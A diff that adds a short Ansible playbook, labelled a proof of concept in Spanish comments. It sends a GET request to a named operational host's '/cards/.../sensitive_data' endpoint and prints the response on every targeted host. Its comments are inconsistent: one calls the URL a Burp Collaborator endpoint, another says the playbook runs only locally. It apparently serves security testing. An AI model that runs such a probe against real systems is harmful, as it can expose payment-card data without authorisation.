@@ -1,0 +1,17 @@
+---
+- name: PoC respuesta req
+  hosts: all  # Esto significa que ejecutamos el playbook en nuestra máquina local
+  gather_facts: no  # No necesitamos información sobre el sistema
+
+  tasks:
+    - name: PoC respuest req
+      uri:
+        url: "http://ingate-operational.melisystems.com/evertec/cards/SJEAUWCWNZLTQLDEPDFIQGLMDGZHAWCGGIBBXGQA/sensitive_data?public_key=a/aaaaaaaaaaaaa="  # URL del Burp Collaborator
+        method: GET  # Método HTTP (puede ser GET, POST, PUT, etc.)
+        return_content: yes  # Para obtener la respuesta en el contenido
+        status_code: 200  # Esperamos un código de estado 200 (OK)
+      register: result  # Guardamos el resultado en una variable
+
+    - name: Mostrar la respuesta del servidor
+      debug:
+        msg: "Respuesta de request: {{ result.content }}"
